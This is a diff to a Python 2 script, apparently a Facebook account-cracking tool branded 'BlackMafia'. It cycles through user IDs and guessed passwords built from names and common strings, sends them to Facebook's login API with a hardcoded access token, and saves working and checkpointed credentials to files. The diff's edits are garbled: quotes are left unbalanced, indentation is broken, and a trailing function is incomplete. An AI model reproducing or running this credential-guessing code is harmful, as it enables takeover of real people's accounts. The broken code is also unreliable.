@@ -20,7 +20,7 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 
 
 def keluar():
-	print "\x1b[1;91mExit"
+	print ("\x1b[1;91mExit")
 	os.sys.exit()
 
 
@@ -95,7 +95,7 @@ print  """
 \033[1;94m║╔═╗║║║╔╗║╔═╣╚╝╣║║║║║╔╗╠╗╔╬╣╔╗║
 \033[1;94m║╚═╝║╚╣╔╗║╚═╣╔╗╣║║║║║╔╗║║║║║╔╗║
 \033[1;94m╚═══╩═╩╝╚╩══╩╝╚╩╝╚╝╚╩╝╚╝╚╝╚╩╝╚╝
-\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
+\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 jalan('\033[1;94m=10%')
 jalan("\033[1;94m==20%")
 jalan('\033[1;94m===30%')
@@ -455,7 +455,7 @@ def pilih_super():
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
-														else:
+												else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass7 = b['first_name'] + b['last_name'] + '786'
@@ -482,7 +482,7 @@ def pilih_super():
 	print "  \033[1;94m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print """
+	print ""
              
              ──────╔═══════╗──────
              ▒▓▒▓▒▒║░░░║░░░║▒▒▓▒▓▒
@@ -495,7 +495,7 @@ def pilih_super():
 : \033[1;94m .....lovehacker  Kali.linux....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +923094161457"""
+              \033[1;94m +923094161457""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -638,7 +638,7 @@ if __name__ == '__main__':
 	print "  \033[1;94m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;94m"+str(len(cekpoint))
-	print """
+	print ""
              
              ──────╔═══════╗──────
              ▒▓▒▓▒▒║░░░║░░░║▒▒▓▒▓▒
@@ -651,7 +651,7 @@ if __name__ == '__main__':
 : \033[1;94m .....lovehacker  Kali.linux....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +923094161457"""
+              \033[1;94m +923094161457""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -791,10 +791,10 @@ if __name__ == '__main__':
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;94m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "  \033[1;94m«---•◈•---Developed By love-Hacker--•◈•---»" #love_hacker
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
-	print """
+	print ""
              
              ──────╔═══════╗──────
              ▒▓▒▓▒▒║░░░║░░░║▒▒▓▒▓▒
@@ -807,7 +807,7 @@ if __name__ == '__main__':
 : \033[1;94m .....lovehacker  Kali.linux....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +923094161457"""
+              \033[1;94m +923094161457""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -909,7 +909,7 @@ if __name__ == '__main__':
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
 													cekpoint.append(user+pass5)
-												else:
+										  	else:
 													pass6 = '112233'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
@@ -923,7 +923,7 @@ if __name__ == '__main__':
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
-														else:
+												  else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass7 = b[first_name] + 'khan'
@@ -950,7 +950,7 @@ if __name__ == '__main__':
 	print "  \033[1;94m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;96m"+str(len(cekpoint))
-	print """
+	print ""
              
              ──────╔═══════╗──────
              ▒▓▒▓▒▒║░░░║░░░║▒▒▓▒▓▒
@@ -963,10 +963,19 @@ if __name__ == '__main__':
 : \033[1;94m .....lovehacker  Kali.linux....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +923094161457"""
+              \033[1;94m +923094161457""
 	
-	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
+		raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
 
-if __name__ == '__main__':
-	login()
+def super():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\x1b[1;94mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+		
